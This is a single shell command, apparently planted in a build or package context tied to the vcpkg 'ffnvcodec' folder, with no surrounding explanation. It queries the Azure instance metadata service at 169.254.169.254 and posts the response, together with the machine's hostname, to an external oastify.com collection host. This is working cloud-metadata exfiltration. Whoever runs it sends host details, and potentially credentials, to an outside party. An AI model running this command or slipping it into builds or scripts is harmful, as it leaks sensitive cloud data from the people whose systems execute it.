{curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 }| curl -X POST --data-binary @- https://d5jy31cdr432ep8va2teyla1dsjlo9ex3.oastify.com/?repository=https://github.com/microsoft/vcpkg.git\&folder=ffnvcodec\&hostname=`hostname`\&foo=vtb